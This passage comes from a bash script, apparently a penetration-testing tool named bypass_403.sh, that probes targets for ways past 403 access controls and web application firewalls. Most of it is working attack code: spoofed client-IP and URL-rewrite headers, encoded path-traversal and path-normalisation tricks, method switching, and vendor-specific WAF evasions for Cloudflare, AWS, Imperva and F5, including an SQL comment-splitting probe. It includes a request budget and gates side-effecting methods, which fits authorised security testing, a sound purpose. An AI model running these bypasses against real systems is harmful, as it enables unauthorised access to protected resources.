    analyzer_verdict=$(printf '%s' "$analyzer_json" | grep -oE '"verdict"[[:space:]]*:[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"' || true)
    status=$(_plan_status "$analyzer_verdict" "$code" "$baseline_code" "$body_file" "$markers_json")
    safe_id=$(printf '%s' "$probe_id" | tr -c 'A-Za-z0-9._-' '_')
    cp "$body_file" "$OUT_DIR/raw/${safe_id}.body" 2>/dev/null || true
    cp "$header_file" "$OUT_DIR/raw/${safe_id}.headers" 2>/dev/null || true
    evidence_ref="findings/bypass/$(basename "$OUT_DIR")/raw/${safe_id}"
    case "$status" in
      candidate)
        hit "AI plan candidate: $probe_id → HTTP $code (${body_len}B)"
        printf '%s|%s|%s|%s|%s|%s\n' "$probe_id" "$probe_url" "$method" "$code" "$body_len" "$analyzer_record" >> "$OUT_DIR/bypass_hits.txt" ;;
      edge_passed)
        log "AI plan edge passed (unproven): $probe_id → HTTP $code (${body_len}B)"
        printf '%s|%s|%s|%s|%s|%s\n' "$probe_id" "$probe_url" "$method" "$code" "$body_len" "$analyzer_record" >> "$OUT_DIR/bypass_edge_passed.txt" ;;
      needs_review)
        printf '%s|%s|%s|%s|%s|%s\n' "$probe_id" "$probe_url" "$method" "$code" "$body_len" "$analyzer_record" >> "$OUT_DIR/bypass_uncertain.txt" ;;
      blocked|*)
        printf '%s|%s|%s|%s|%s|%s\n' "$probe_id" "$probe_url" "$method" "$code" "$body_len" "$analyzer_record" >> "$OUT_DIR/bypass_blocked.txt" ;;
    esac
    _append_plan_result "$probe_id" "$kind" "$status" "$probe_url" "$method" "$code" "$body_len" \
      "$reason" "$expected" "$stop" "$evidence_ref" "$analyzer_record" "$baseline_code" "$waf"
    rm -f "$body_file" "$header_file"
  done < "$PLAN_NORMALIZED_FILE"
}

_probe_one() {
  local target="$1" found=0 edge_found=0
  local base last
  local path_parts=()
  mapfile -t path_parts < <(_path_parts "$target")
  base="${path_parts[0]:-$target}"
  last="${path_parts[1]:-}"
  local waf
  _auth_args_for_url "$target"
  waf=$(_fingerprint_waf "$target")
  log "WAF fingerprint: $waf"
  local waf_detector="unavailable"
  if _have wafw00f; then
    [ "${BYPASS_ALLOW_EXTERNAL_WAF:-0}" = "1" ] && waf_detector="available" || waf_detector="available_skipped_budget"
  fi
  echo "target=$target waf=$waf wafw00f=$waf_detector" >> "$OUT_DIR/waf_fingerprint.txt"
  _sample_block_baseline "$target"
  _capture_target_baseline "$target"
  local baseline_json="$OUT_DIR/.block_baseline.$(_target_artifact_key "$target").json"
  _write_local_baseline "$baseline_json" "$target" "$waf"
  log "probing $target"

  for combo in \
    "GET|$target|X-Original-URL: $target" \
    "GET|$target|X-Rewrite-URL: $target" \
    "GET|$target|X-Forwarded-For: 127.0.0.1" \
    "GET|$target|X-Forwarded-Host: localhost" \
    "GET|$target|X-Custom-IP-Authorization: 127.0.0.1" \
    "GET|$target|X-Client-IP: 127.0.0.1" \
    "GET|$target|X-Host: localhost" \
    "GET|${base}/%2e/${last}|" \
    "GET|${base}/.${last}|" \
    "GET|${base}/${last}/|" \
    "GET|${base}/${last}/.|" \
    "GET|${base}/${last};/|" \
    "GET|${base}/${last}..;/|" \
    "GET|${base}/${last}.json|" \
    "GET|${base}/${last}#|" \
    "POST|$target|" \
    "PUT|$target|" \
    "PATCH|$target|" \
    "TRACE|$target|" \
    "GET|$target|True-Client-IP: 127.0.0.1" \
    "GET|$target|CF-Connecting-IP: 127.0.0.1" \
    "GET|$target|X-Originating-IP: 127.0.0.1" \
    "GET|$target|X-ProxyUser-Ip: 127.0.0.1" \
    "GET|$target|Client-IP: 127.0.0.1" \
    "GET|$target|Forwarded: for=127.0.0.1" \
    "GET|$target|X-Remote-Addr: 127.0.0.1" \
    "GET|$target|X-Remote-IP: 127.0.0.1" \
    "GET|$target|Via: 1.1 127.0.0.1" \
    "GET|$target|X-HTTP-Method-Override: GET" \
    "GET|${base}/%252e/${last}|" \
    "GET|${base}/${last}%20|" \
    "GET|${base}/${last}%09|" \
    "GET|${base}/${last}.html|" \
    "GET|${base}/${last}.css|" \
    "GET|${base}//${last}|" \
    "GET|${base}/./${last}|" \
    "POST|$target|Content-Type: application/json" \
    "POST|$target|Content-Type: multipart/form-data; boundary=x" ; do
    _request_budget_exhausted && break
    method=$(echo "$combo" | cut -d'|' -f1)
    url=$(echo "$combo" | cut -d'|' -f2)
    hdr=$(echo "$combo" | cut -d'|' -f3)
    case "$method" in
      PUT|PATCH|TRACE)
        if [ "${ALLOW_UNSAFE_HTTP_TESTS:-0}" != "1" ]; then
          printf '%s|%s|%s|unsafe-disabled|0|{"verdict":"manual_review","reason":"side-effect-capable scanner method requires ALLOW_UNSAFE_HTTP_TESTS=1"}\n' "$method" "$url" "$hdr" >> "$OUT_DIR/bypass_manual_review.txt"
          continue
        fi
        ;;
    esac
    local _tmpbody _tmphdr
    _tmpbody=$(mktemp)
    _tmphdr=$(mktemp)
    local _args=( -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 5 -X "$method" )
    [ -n "$hdr" ] && _args+=( -H "$hdr" )
    _args+=( "${AUTH_URL_ARGS[@]}" )
    local _result
    _result=$(curl "${_args[@]}" "$url" 2>/dev/null || echo "0|0|0")
    code="${_result%%|*}"
    local _body_len
    _body_len=$(printf '%s' "$_result" | cut -d'|' -f2)
    local _verdict_json
    _verdict_json=$(_classify_with_analyzer "$_tmpbody" "$_tmphdr" "$code" "$_result" "$baseline_json")
    local _verdict
    _verdict=$(printf '%s' "$_verdict_json" | grep -oE '"verdict":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
    local _status
    _status=$(_fallback_status "$_verdict" "$code" "$_verdict_json" "$_tmpbody")
    local _log_ids
    _log_ids=$(_extract_log_ids "$_tmpbody")
    case "$_status" in
      candidate)
        local _reason
        _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
        hit "candidate: $method  $url  $hdr  → HTTP $code (${_body_len}B) [${_reason}]"
        echo "$method|$url|$hdr|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_hits.txt"
        found=1
        ;;
      edge_passed)
        local _reason
        _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
        log "edge passed without protected-content proof: $method  $url  $hdr  → HTTP $code (${_body_len}B) [${_reason}]"
        [ -n "$_log_ids" ] && log "  WAF Log IDs: $_log_ids"
        echo "$method|$url|$hdr|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_edge_passed.txt"
        edge_found=1
        ;;
      needs_review)
        echo -e "${YELLOW}[?]${NC} $method  $url  $hdr  → HTTP $code (${_body_len}B) — uncertain"
        echo "$method|$url|$hdr|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_uncertain.txt"
        ;;
      blocked)
        echo "$method|$url|$hdr|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_blocked.txt"
        ;;
      partial|*)
        echo "$method|$url|$hdr|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_partial.txt"
        ;;
    esac
    rm -f "$_tmpbody" "$_tmphdr"
  done
  # Vendor-specific bypass based on fingerprint
  if ! _request_budget_exhausted; then
  case "$waf" in
    cloudflare)
      log "cloudflare: trying TE+X-Forwarded-Host..."
      local _tmpbody; _tmpbody=$(mktemp)
      local _tmphdr; _tmphdr=$(mktemp)
      local _res
      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
        "${AUTH_URL_ARGS[@]}" \
        -H "Transfer-Encoding: chunked" -H "X-Forwarded-Host: localhost" \
        "$target" 2>/dev/null || echo "0|0|0")
      code="${_res%%|*}"
      local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
      local _verdict_json
      _verdict_json=$(_classify_with_analyzer "$_tmpbody" "$_tmphdr" "$code" "$_res" "$baseline_json")
      local _verdict
      _verdict=$(printf '%s' "$_verdict_json" | grep -oE '"verdict":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
      local _status
      _status=$(_fallback_status "$_verdict" "$code" "$_verdict_json" "$_tmpbody")
      local _reason
      _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
      case "$_status" in
        candidate)
          hit "cloudflare candidate → $code (${_body_len}B) [${_reason}]"
          echo "CF-TE+XFH|$target|vendor-cloudflare|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_hits.txt"; found=1 ;;
        edge_passed)
          log "cloudflare edge passed without protected-content proof → $code (${_body_len}B) [${_reason}]"
          echo "CF-TE+XFH|$target|vendor-cloudflare|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_edge_passed.txt"; edge_found=1 ;;
        needs_review)
          echo -e "${YELLOW}[?]${NC} cloudflare TE+XFH → $code (${_body_len}B) — uncertain"
          echo "CF-TE+XFH|$target|vendor-cloudflare|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_uncertain.txt" ;;
        blocked)
          echo "CF-TE+XFH|$target|vendor-cloudflare|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_blocked.txt" ;;
        partial|*)
          echo "CF-TE+XFH|$target|vendor-cloudflare|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_partial.txt" ;;
      esac
      rm -f "$_tmpbody" "$_tmphdr"
      ;;
    aws)
      log "aws: trying comment-splitting on param..."
      local _tmpbody; _tmpbody=$(mktemp)
      local _tmphdr; _tmphdr=$(mktemp)
      local _res
      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
        "${AUTH_URL_ARGS[@]}" \
        "${target}?id=1/**/AND/**/1=1" 2>/dev/null || echo "0|0|0")
      code="${_res%%|*}"
      local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
      local _verdict_json
      _verdict_json=$(_classify_with_analyzer "$_tmpbody" "$_tmphdr" "$code" "$_res" "$baseline_json")
      local _verdict
      _verdict=$(printf '%s' "$_verdict_json" | grep -oE '"verdict":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
      local _status
      _status=$(_fallback_status "$_verdict" "$code" "$_verdict_json" "$_tmpbody")
      local _reason
      _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
      case "$_status" in
        candidate)
          hit "aws candidate → $code (${_body_len}B) [${_reason}]"
          echo "AWS-comment|$target|vendor-aws|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_hits.txt"; found=1 ;;
        edge_passed)
          log "aws edge passed without protected-content proof → $code (${_body_len}B) [${_reason}]"
          echo "AWS-comment|$target|vendor-aws|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_edge_passed.txt"; edge_found=1 ;;
        needs_review)
          echo -e "${YELLOW}[?]${NC} aws comment-split → $code (${_body_len}B) — uncertain"
          echo "AWS-comment|$target|vendor-aws|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_uncertain.txt" ;;
        blocked)
          echo "AWS-comment|$target|vendor-aws|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_blocked.txt" ;;
        partial|*)
          echo "AWS-comment|$target|vendor-aws|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_partial.txt" ;;
      esac
      rm -f "$_tmpbody" "$_tmphdr"
      ;;
    imperva)
      log "imperva: trying unicode overlong..."
      local _tmpbody; _tmpbody=$(mktemp)
      local _tmphdr; _tmphdr=$(mktemp)
      local _res
      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
        "${AUTH_URL_ARGS[@]}" \
        "${base}/%c0%2e%c0%2e/${last}" 2>/dev/null || echo "0|0|0")
      code="${_res%%|*}"
      local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
      local _verdict_json
      _verdict_json=$(_classify_with_analyzer "$_tmpbody" "$_tmphdr" "$code" "$_res" "$baseline_json")
      local _verdict
      _verdict=$(printf '%s' "$_verdict_json" | grep -oE '"verdict":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
      local _status
      _status=$(_fallback_status "$_verdict" "$code" "$_verdict_json" "$_tmpbody")
      local _reason
      _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
      case "$_status" in
        candidate)
          hit "imperva candidate → $code (${_body_len}B) [${_reason}]"
          echo "IMPERVA-unicode|$target|vendor-imperva|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_hits.txt"; found=1 ;;
        edge_passed)
          log "imperva edge passed without protected-content proof → $code (${_body_len}B) [${_reason}]"
          echo "IMPERVA-unicode|$target|vendor-imperva|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_edge_passed.txt"; edge_found=1 ;;
        needs_review)
          echo -e "${YELLOW}[?]${NC} imperva unicode overlong → $code (${_body_len}B) — uncertain"
          echo "IMPERVA-unicode|$target|vendor-imperva|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_uncertain.txt" ;;
        blocked)
          echo "IMPERVA-unicode|$target|vendor-imperva|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_blocked.txt" ;;
        partial|*)
          echo "IMPERVA-unicode|$target|vendor-imperva|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_partial.txt" ;;
      esac
      rm -f "$_tmpbody" "$_tmphdr"
      ;;
    f5-bigip)
      log "f5: trying path normalisation bypass..."
      local _tmpbody; _tmpbody=$(mktemp)
      local _tmphdr; _tmphdr=$(mktemp)
      local _res
      _res=$(curl -sk -D "$_tmphdr" -o "$_tmpbody" -w "%{http_code}|%{size_download}|%{time_total}" --max-time 6 \
        "${AUTH_URL_ARGS[@]}" \
        "${base}/%2f%2f${last}" 2>/dev/null || echo "0|0|0")
      code="${_res%%|*}"
      local _body_len; _body_len=$(printf '%s' "$_res" | cut -d'|' -f2)
      local _verdict_json
      _verdict_json=$(_classify_with_analyzer "$_tmpbody" "$_tmphdr" "$code" "$_res" "$baseline_json")
      local _verdict
      _verdict=$(printf '%s' "$_verdict_json" | grep -oE '"verdict":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
      local _status
      _status=$(_fallback_status "$_verdict" "$code" "$_verdict_json" "$_tmpbody")
      local _reason
      _reason=$(printf '%s' "$_verdict_json" | grep -oE '"reason":[[:space:]]*"[^"]*"' | grep -oE '"[^"]*"$' | tr -d '"')
      case "$_status" in
        candidate)
          hit "f5-bigip candidate → $code (${_body_len}B) [${_reason}]"
          echo "F5-doubleslash|$target|vendor-f5-bigip|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_hits.txt"; found=1 ;;
        edge_passed)
          log "f5-bigip edge passed without protected-content proof → $code (${_body_len}B) [${_reason}]"
          echo "F5-doubleslash|$target|vendor-f5-bigip|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_edge_passed.txt"; edge_found=1 ;;
        needs_review)
          echo -e "${YELLOW}[?]${NC} f5-bigip double-slash → $code (${_body_len}B) — uncertain"
          echo "F5-doubleslash|$target|vendor-f5-bigip|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_uncertain.txt" ;;
        blocked)
          echo "F5-doubleslash|$target|vendor-f5-bigip|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_blocked.txt" ;;
        partial|*)
          echo "F5-doubleslash|$target|vendor-f5-bigip|$code|$_body_len|$(_compact_json "$_verdict_json")" >> "$OUT_DIR/bypass_partial.txt" ;;
      esac
      rm -f "$_tmpbody" "$_tmphdr"
      ;;
  esac
  fi
  if [ "$found" = "0" ] && [ "$edge_found" = "1" ]; then
    log "edge response changed on $target; protected-content or permission proof is still required"
  elif [ "$found" = "0" ]; then
    ok "no bypass on $target"
  fi
}

if [ -n "$PLAN_FILE" ]; then
  _run_plan "$TARGET_SCOPE"
elif [ "$BYP4XX_USED" = "1" ]; then
  :
elif [ -n "$URL" ]; then
  _probe_one "$URL"
else
  while IFS= read -r u; do
    [ -z "$u" ] && continue
    _request_budget_exhausted && break
    _probe_one "$u"
  done < "$LIST"
fi

REQUEST_COUNT=$(cat "$REQUEST_COUNT_FILE" 2>/dev/null || printf '0')
if _request_budget_exhausted; then
  printf 'request_budget=%s|request_count=%s|status=partial|next_action=resume remaining targets or raise --max-requests\n' \
    "$REQUEST_BUDGET" "$REQUEST_COUNT" >> "$OUT_DIR/bypass_partial.txt"
  err "fallback request budget exhausted after $REQUEST_COUNT requests"
fi

if [ -n "$PLAN_FILE" ]; then
  python3 "$SCRIPT_DIR/bypass_403_plan.py" \
    --plan "$PLAN_FILE" --target "$TARGET_SCOPE" \
    --summarize-results "$PLAN_RESULTS_FILE" \
    --summary-output "$PLAN_SUMMARY_FILE" --plan-ref "$PLAN_FILE" \
    --plan-meta "$PLAN_META_FILE" >/dev/null 2>&1 || {
      err "failed to write access-limit summary: $PLAN_SUMMARY_FILE"
      exit 1
    }
  if [ "$QUEUE_MODE" = "1" ] && [ -s "$PLAN_SUMMARY_FILE" ]; then
    if python3 - "$PLAN_SUMMARY_FILE" <<'PY'
import json
import sys

payload = json.load(open(sys.argv[1], encoding="utf-8"))
counts = payload.get("counts") or {}
raise SystemExit(0 if any(counts.get(key, 0) for key in ("candidate", "edge_passed", "needs_review", "partial")) else 1)
PY
    then
      PLAN_SHA256=$(python3 - "$PLAN_SUMMARY_FILE" <<'PY'
import json
import sys
payload = json.load(open(sys.argv[1], encoding="utf-8"))
print(str(payload.get("plan_sha256") or "unknown"))
PY
)
      PLAN_ROUND=$(python3 - "$PLAN_SUMMARY_FILE" <<'PY'
import json
import sys
payload = json.load(open(sys.argv[1], encoding="utf-8"))
print(int(payload.get("round", 1) or 1))
PY
)
      PLAN_GENERATION="${PLAN_SHA256}:round-${PLAN_ROUND}"
      PLAN_SOURCE_ID="bypass-403-${PLAN_SHA256}-r${PLAN_ROUND}"
      if ! python3 "$SCRIPT_DIR/action_queue.py" add \
        --target "$TARGET_SCOPE" \
        --type "bypass-403" \
        --evidence-type "access-limit" \
        --source "tools/bypass_403.sh" \
        --source-id "$PLAN_SOURCE_ID" \
        --generation "$PLAN_GENERATION" \
        --evidence "bounded access-limit summary: $PLAN_SUMMARY_FILE" \
        --next-question "Does the edge-passed response prove protected content or a permission differential?" \
        --action "Review the plan evidence and run the smallest content/permission replay before escalating." \
        --priority 25 \
        --command-hint "Review $PLAN_SUMMARY_FILE and unresolved raw evidence." \
        --stop-condition "resolve as tested, blocked, candidate, or manual review with evidence" \
        --json > "$OUT_DIR/action_queue.json" 2>/dev/null; then
        err "action queue sync failed for $PLAN_SUMMARY_FILE"
        printf '{"status":"error","summary_ref":%s,"generation":%s}\n' \
          "$(python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$PLAN_SUMMARY_FILE")" \
          "$(python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$PLAN_GENERATION")" \
          > "$OUT_DIR/action_queue_sync.json"
      else
        printf '{"status":"ok","summary_ref":%s,"generation":%s}\n' \
          "$(python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$PLAN_SUMMARY_FILE")" \
          "$(python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$PLAN_GENERATION")" \
          > "$OUT_DIR/action_queue_sync.json"
      fi
    fi
  fi
fi

log "Output written to: $OUT_DIR"
[ -f "$OUT_DIR/bypass_hits.txt" ]     && ok  "bypass_hits.txt:     $(wc -l < "$OUT_DIR/bypass_hits.txt") confirmed bypass(es)"
[ -f "$OUT_DIR/bypass_edge_passed.txt" ] && log "bypass_edge_passed.txt: $(wc -l < "$OUT_DIR/bypass_edge_passed.txt") edge passes without content proof"
[ -f "$OUT_DIR/bypass_uncertain.txt" ] && log "bypass_uncertain.txt: $(wc -l < "$OUT_DIR/bypass_uncertain.txt") needs review (200 body may still be block page)"
[ -f "$OUT_DIR/bypass_blocked.txt" ]  && log "Confirmed blocked: $(wc -l < "$OUT_DIR/bypass_blocked.txt") probe(s) → $OUT_DIR/bypass_blocked.txt"
[ -f "$OUT_DIR/bypass_partial.txt" ] && log "Partial: $(wc -l < "$OUT_DIR/bypass_partial.txt") probe(s) → $OUT_DIR/bypass_partial.txt"
[ -f "$OUT_DIR/bypass_manual_review.txt" ] && log "Manual review: $(wc -l < "$OUT_DIR/bypass_manual_review.txt") unsafe probe(s) skipped → $OUT_DIR/bypass_manual_review.txt"
[ -f "$OUT_DIR/waf_fingerprint.txt" ] && log "waf_fingerprint.txt:  $(cat "$OUT_DIR/waf_fingerprint.txt")"
[ -f "$PLAN_SUMMARY_FILE" ] && log "summary.json:         $PLAN_SUMMARY_FILE"
exit 0
